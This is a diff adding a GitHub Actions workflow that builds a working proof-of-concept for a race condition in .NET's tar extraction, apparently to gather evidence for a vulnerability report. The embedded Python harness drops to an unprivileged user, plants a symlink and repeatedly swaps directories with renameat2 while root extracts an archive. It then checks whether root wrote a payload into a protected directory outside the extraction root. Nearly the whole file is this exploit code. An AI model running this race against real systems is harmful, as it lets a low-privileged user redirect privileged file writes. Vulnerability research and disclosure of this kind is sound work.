@@ -1,0 +1,446 @@
+name: Tar TOCTOU .NET 10.0.13
+
+on:
+  push:
+    paths:
+      - '.github/workflows/tar-toctou-10.0.13.yml'
+  pull_request:
+    paths:
+      - '.github/workflows/tar-toctou-10.0.13.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  runtime-matrix:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install exact .NET SDK
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.402'
+
+      - name: Create current-runtime harness
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p "$RUNNER_TEMP/tar-race/src"
+          cat > "$RUNNER_TEMP/tar-race/src/TarRace.csproj" <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <OutputType>Exe</OutputType>
+              <TargetFramework>net10.0</TargetFramework>
+              <ImplicitUsings>enable</ImplicitUsings>
+              <Nullable>enable</Nullable>
+              <TreatWarningsAsErrors>true</TreatWarningsAsErrors>
+            </PropertyGroup>
+          </Project>
+          EOF
+
+          cat > "$RUNNER_TEMP/tar-race/src/Program.cs" <<'EOF'
+          using System.Formats.Tar;
+          using System.Text.Json;
+
+          static int Usage()
+          {
+              Console.Error.WriteLine("extract-once <archive> <dest> | extract-loop <archive> <dest> <outsideMarker> <payload> <iterations>");
+              return 64;
+          }
+
+          if (args.Length < 3)
+          {
+              return Usage();
+          }
+
+          if (args[0] == "extract-once")
+          {
+              TarFile.ExtractToDirectory(args[1], args[2], overwriteFiles: true);
+              return 0;
+          }
+
+          if (args[0] != "extract-loop" || args.Length != 6 || !int.TryParse(args[5], out int iterations))
+          {
+              return Usage();
+          }
+
+          string archive = args[1];
+          string destination = args[2];
+          string outsideMarker = args[3];
+          string payload = args[4];
+          int completed = 0;
+          int rejected = 0;
+          var exceptionTypes = new Dictionary<string, int>(StringComparer.Ordinal);
+          bool escaped = false;
+
+          for (int i = 0; i < iterations; i++)
+          {
+              try
+              {
+                  TarFile.ExtractToDirectory(archive, destination, overwriteFiles: true);
+                  completed++;
+              }
+              catch (Exception ex) when (ex is IOException or UnauthorizedAccessException)
+              {
+                  rejected++;
+                  string key = ex.GetType().FullName ?? ex.GetType().Name;
+                  exceptionTypes[key] = exceptionTypes.TryGetValue(key, out int n) ? n + 1 : 1;
+              }
+
+              if (File.Exists(outsideMarker))
+              {
+                  try
+                  {
+                      if (File.ReadAllText(outsideMarker) == payload)
+                      {
+                          escaped = true;
+                          break;
+                      }
+                  }
+                  catch (IOException)
+                  {
+                  }
+              }
+          }
+
+          Console.WriteLine(JsonSerializer.Serialize(new
+          {
+              escaped,
+              completed,
+              rejected,
+              iterationsRequested = iterations,
+              exceptionTypes,
+              processUid = Environment.GetEnvironmentVariable("SUDO_UID") ?? "root-run"
+          }));
+          return escaped ? 42 : 0;
+          EOF
+
+          cat > "$RUNNER_TEMP/tar-race/run.py" <<'PY'
+          #!/usr/bin/env python3
+          import argparse
+          import ctypes
+          import hashlib
+          import io
+          import json
+          import multiprocessing as mp
+          import os
+          import shutil
+          import signal
+          import stat
+          import subprocess
+          import tarfile
+          import time
+          import uuid
+          from pathlib import Path
+
+          AT_FDCWD = -100
+          RENAME_EXCHANGE = 2
+          LOW_UID = 65534
+          LOW_GID = 65534
+
+          def sha256(path: Path) -> str:
+              h = hashlib.sha256()
+              with path.open('rb') as f:
+                  for block in iter(lambda: f.read(1024 * 1024), b''):
+                      h.update(block)
+              return h.hexdigest()
+
+          def make_setup_tar(path: Path) -> None:
+              with tarfile.open(path, 'w', format=tarfile.PAX_FORMAT) as tf:
+                  entry = tarfile.TarInfo('outer/')
+                  entry.type = tarfile.DIRTYPE
+                  entry.mode = 0o777
+                  entry.uid = 0
+                  entry.gid = 0
+                  entry.mtime = int(time.time())
+                  tf.addfile(entry)
+
+          def make_payload_tar(path: Path, payload: bytes) -> None:
+              with tarfile.open(path, 'w', format=tarfile.PAX_FORMAT) as tf:
+                  entry = tarfile.TarInfo('outer/inner/marker.txt')
+                  entry.mode = 0o644
+                  entry.uid = 0
+                  entry.gid = 0
+                  entry.mtime = int(time.time())
+                  entry.size = len(payload)
+                  tf.addfile(entry, io.BytesIO(payload))
+
+          def drop_privileges() -> None:
+              os.setgroups([])
+              os.setgid(LOW_GID)
+              os.setuid(LOW_UID)
+
+          def low_setup(outer: Path, outside: Path, result_fd: int) -> None:
+              try:
+                  drop_privileges()
+                  inner = outer / 'inner'
+                  swap = outer / 'swap'
+                  inner.mkdir()
+                  swap.symlink_to(outside, target_is_directory=True)
+                  direct_denied = False
+                  try:
+                      (outside / 'direct-low-write.txt').write_text('must-not-write')
+                  except (PermissionError, OSError):
+                      direct_denied = True
+                  os.write(result_fd, json.dumps({
+                      'uid': os.getuid(),
+                      'gid': os.getgid(),
+                      'inner_created': inner.is_dir(),
+                      'swap_is_symlink': swap.is_symlink(),
+                      'direct_outside_write_denied': direct_denied,
+                  }).encode())
+              except BaseException as exc:
+                  os.write(result_fd, json.dumps({'error': repr(exc)}).encode())
+              finally:
+                  os.close(result_fd)
+                  os._exit(0)
+
+          def create_low_layout(outer: Path, outside: Path) -> dict:
+              rfd, wfd = os.pipe()
+              pid = os.fork()
+              if pid == 0:
+                  os.close(rfd)
+                  low_setup(outer, outside, wfd)
+              os.close(wfd)
+              raw = b''
+              while True:
+                  chunk = os.read(rfd, 65536)
+                  if not chunk:
+                      break
+                  raw += chunk
+              os.close(rfd)
+              _, status = os.waitpid(pid, 0)
+              result = json.loads(raw.decode() or '{}')
+              result['wait_status'] = status
+              return result
+
+          def toggler(inner: str, swap: str, stop: mp.Event, counter: mp.Value, error_path: str) -> None:
+              try:
+                  drop_privileges()
+                  libc = ctypes.CDLL(None, use_errno=True)
+                  renameat2 = libc.renameat2
+                  renameat2.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p, ctypes.c_uint]
+                  renameat2.restype = ctypes.c_int
+                  a = os.fsencode(inner)
+                  b = os.fsencode(swap)
+                  local_count = 0
+                  while not stop.is_set():
+                      if renameat2(AT_FDCWD, a, AT_FDCWD, b, RENAME_EXCHANGE) != 0:
+                          err = ctypes.get_errno()
+                          raise OSError(err, os.strerror(err))
+                      local_count += 1
+                      if local_count % 1000 == 0:
+                          with counter.get_lock():
+                              counter.value = local_count
+                  with counter.get_lock():
+                      counter.value = local_count
+              except BaseException as exc:
+                  Path(error_path).write_text(repr(exc))
+
+          def extract_once(dotnet: Path, dll: Path, archive: Path, dest: Path) -> subprocess.CompletedProcess:
+              return subprocess.run([str(dotnet), str(dll), 'extract-once', str(archive), str(dest)], text=True, capture_output=True)
+
+          def extract_loop(dotnet: Path, dll: Path, archive: Path, dest: Path, outside_marker: Path, payload: str, iterations: int) -> subprocess.CompletedProcess:
+              return subprocess.run([
+                  str(dotnet), str(dll), 'extract-loop', str(archive), str(dest), str(outside_marker), payload, str(iterations)
+              ], text=True, capture_output=True)
+
+          def prepare_case(root: Path, dotnet: Path, dll: Path, payload: str) -> dict:
+              dest = root / 'dest'
+              outside = root / 'protected-outside'
+              dest.mkdir(parents=True, mode=0o755)
+              outside.mkdir(mode=0o700)
+              os.chmod(dest, 0o755)
+              os.chmod(outside, 0o700)
+              setup_tar = root / 'setup.tar'
+              payload_tar = root / 'payload.tar'
+              make_setup_tar(setup_tar)
+              make_payload_tar(payload_tar, payload.encode())
+              setup_run = extract_once(dotnet, dll, setup_tar, dest)
+              outer = dest / 'outer'
+              outer_mode = stat.S_IMODE(outer.stat().st_mode) if outer.exists() else None
+              low_layout = create_low_layout(outer, outside) if outer.exists() else {'error': 'outer missing'}
+              return {
+                  'dest': dest,
+                  'outside': outside,
+                  'outer': outer,
+                  'setup_tar': setup_tar,
+                  'payload_tar': payload_tar,
+                  'setup_run': {
+                      'returncode': setup_run.returncode,
+                      'stdout': setup_run.stdout,
+                      'stderr': setup_run.stderr,
+                  },
+                  'outer_mode': outer_mode,
+                  'low_layout': low_layout,
+                  'setup_tar_sha256': sha256(setup_tar),
+                  'payload_tar_sha256': sha256(payload_tar),
+              }
+
+          def run_control(base: Path, dotnet: Path, dll: Path) -> dict:
+              root = base / 'control-no-race'
+              root.mkdir()
+              payload = f'CONTROL-{uuid.uuid4().hex}'
+              case = prepare_case(root, dotnet, dll, payload)
+              outside_marker = case['outside'] / 'marker.txt'
+              run = extract_loop(dotnet, dll, case['payload_tar'], case['dest'], outside_marker, payload, 200)
+              inside_marker = case['dest'] / 'outer' / 'inner' / 'marker.txt'
+              return {
+                  'setup': {k: str(v) if isinstance(v, Path) else v for k, v in case.items()},
+                  'extract': {'returncode': run.returncode, 'stdout': run.stdout, 'stderr': run.stderr},
+                  'inside_exact': inside_marker.exists() and inside_marker.read_text() == payload,
+                  'outside_exists': outside_marker.exists(),
+              }
+
+          def run_attack_trial(base: Path, index: int, dotnet: Path, dll: Path, iterations: int) -> dict:
+              root = base / f'attack-{index:02d}'
+              root.mkdir()
+              payload = f'ATTACK-{index}-{uuid.uuid4().hex}'
+              case = prepare_case(root, dotnet, dll, payload)
+              outside_marker = case['outside'] / 'marker.txt'
+              stop = mp.Event()
+              counter = mp.Value('Q', 0)
+              error_path = root / 'toggler-error.txt'
+              process = mp.Process(target=toggler, args=(
+                  str(case['outer'] / 'inner'), str(case['outer'] / 'swap'), stop, counter, str(error_path)
+              ))
+              process.start()
+              time.sleep(0.05)
+              start = time.monotonic()
+              run = extract_loop(dotnet, dll, case['payload_tar'], case['dest'], outside_marker, payload, iterations)
+              elapsed = time.monotonic() - start
+              stop.set()
+              process.join(5)
+              if process.is_alive():
+                  process.terminate()
+                  process.join(5)
+              outside_exact = outside_marker.exists() and outside_marker.read_text() == payload
+              outside_stat = None
+              if outside_marker.exists():
+                  st = outside_marker.stat()
+                  outside_stat = {'uid': st.st_uid, 'gid': st.st_gid, 'mode': stat.S_IMODE(st.st_mode), 'size': st.st_size}
+              return {
+                  'index': index,
+                  'setup': {k: str(v) if isinstance(v, Path) else v for k, v in case.items()},
+                  'extract': {'returncode': run.returncode, 'stdout': run.stdout, 'stderr': run.stderr},
+                  'elapsed_seconds': elapsed,
+                  'toggles': counter.value,
+                  'toggler_exitcode': process.exitcode,
+                  'toggler_error': error_path.read_text() if error_path.exists() else None,
+                  'outside_exact': outside_exact,
+                  'outside_stat': outside_stat,
+                  'payload': payload,
+              }
+
+          def main() -> int:
+              parser = argparse.ArgumentParser()
+              parser.add_argument('--dotnet', required=True)
+              parser.add_argument('--dll', required=True)
+              parser.add_argument('--work', required=True)
+              parser.add_argument('--iterations', type=int, default=15000)
+              parser.add_argument('--trials', type=int, default=3)
+              args = parser.parse_args()
+              if os.geteuid() != 0:
+                  raise SystemExit('must run as root')
+              dotnet = Path(args.dotnet).resolve()
+              dll = Path(args.dll).resolve()
+              work = Path(args.work).resolve()
+              shutil.rmtree(work, ignore_errors=True)
+              work.mkdir(parents=True)
+
+              version = subprocess.run([str(dotnet), '--info'], text=True, capture_output=True)
+              control = run_control(work, dotnet, dll)
+              attacks = [run_attack_trial(work, i + 1, dotnet, dll, args.iterations) for i in range(args.trials)]
+              positive_count = sum(1 for x in attacks if x['outside_exact'])
+              control_pass = control['inside_exact'] and not control['outside_exists'] and control['extract']['returncode'] == 0
+              low_denials = all(x['setup']['low_layout'].get('direct_outside_write_denied') is True for x in attacks)
+              setup_modes = [x['setup']['outer_mode'] for x in attacks]
+              result = {
+                  'schema': 'dotnet-tar-postfix-toctou-runtime-v1',
+                  'runtime': {'dotnet_info': version.stdout, 'dotnet_info_stderr': version.stderr, 'dotnet_path': str(dotnet), 'helper_sha256': sha256(dll)},
+                  'control': control,
+                  'attacks': attacks,
+                  'summary': {
+                      'positive_trials': positive_count,
+                      'required_positive_trials': args.trials,
+                      'control_pass': control_pass,
+                      'direct_low_write_denied_all': low_denials,
+                      'outer_modes': setup_modes,
+                  },
+              }
+              if positive_count == args.trials and control_pass and low_denials:
+                  result['verdict'] = 'RUNTIME_POSITIVE_OUTSIDE_ROOT_WRITE_TOCTOU'
+                  code = 42
+              elif positive_count > 0:
+                  result['verdict'] = 'PARTIAL_RUNTIME_POSITIVE_NOT_SUBMISSION_READY'
+                  code = 41
+              else:
+                  result['verdict'] = 'RUNTIME_NEGATIVE_OR_RACE_NOT_WON'
+                  code = 0 if control_pass and low_denials else 30
+              (work / 'RESULT.json').write_text(json.dumps(result, indent=2))
+              print(json.dumps(result['summary'], indent=2))
+              print(result['verdict'])
+              return code
+
+          if __name__ == '__main__':
+              raise SystemExit(main())
+          PY
+          chmod +x "$RUNNER_TEMP/tar-race/run.py"
+          cp "$RUNNER_TEMP/tar-race/src/Program.cs" "$RUNNER_TEMP/tar-race/Program.cs"
+          cp "$RUNNER_TEMP/tar-race/src/TarRace.csproj" "$RUNNER_TEMP/tar-race/TarRace.csproj"
+
+      - name: Build exact current-runtime helper
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet --info | tee "$RUNNER_TEMP/tar-race/DOTNET_INFO.txt"
+          dotnet build "$RUNNER_TEMP/tar-race/src/TarRace.csproj" -c Release --nologo
+          sha256sum "$RUNNER_TEMP/tar-race/src/bin/Release/net10.0/TarRace.dll" | tee "$RUNNER_TEMP/tar-race/HELPER_SHA256.txt"
+
+      - name: Execute root-versus-low runtime matrix
+        id: matrix
+        continue-on-error: true
+        shell: bash
+        run: |
+          set -o pipefail
+          sudo -E python3 "$RUNNER_TEMP/tar-race/run.py" \
+            --dotnet "$(command -v dotnet)" \
+            --dll "$RUNNER_TEMP/tar-race/src/bin/Release/net10.0/TarRace.dll" \
+            --work /var/tmp/dotnet-tar-toctou-10.0.13 \
+            --iterations 15000 \
+            --trials 3 \
+            2>&1 | tee "$RUNNER_TEMP/tar-race/RUN.log"
+          code=${PIPESTATUS[0]}
+          echo "runner_exit_code=$code" | tee "$RUNNER_TEMP/tar-race/RUNNER_EXIT_CODE.txt"
+          sudo cp /var/tmp/dotnet-tar-toctou-10.0.13/RESULT.json "$RUNNER_TEMP/tar-race/RESULT.json" 2>/dev/null || true
+          sudo chown -R "$(id -u):$(id -g)" "$RUNNER_TEMP/tar-race" /var/tmp/dotnet-tar-toctou-10.0.13 2>/dev/null || true
+          exit 0
+
+      - name: Seal evidence
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd "$RUNNER_TEMP/tar-race"
+          find . -type f ! -name SHA256SUMS.txt -print0 | sort -z | xargs -0 sha256sum > SHA256SUMS.txt
+          python3 -m json.tool RESULT.json >/dev/null
+          cat RUNNER_EXIT_CODE.txt
+          python3 - <<'PY'
+          import json, os
+          from pathlib import Path
+          p = Path(os.environ['RUNNER_TEMP']) / 'tar-race' / 'RESULT.json'
+          d = json.loads(p.read_text())
+          print(json.dumps({'verdict': d['verdict'], **d['summary']}, indent=2))
+          PY
+
+      - name: Upload runtime evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: dotnet-tar-toctou-10.0.13-evidence
+          path: |
+            ${{ runner.temp }}/tar-race/**
+          if-no-files-found: error
+          compression-level: 9
+          retention-days: 7
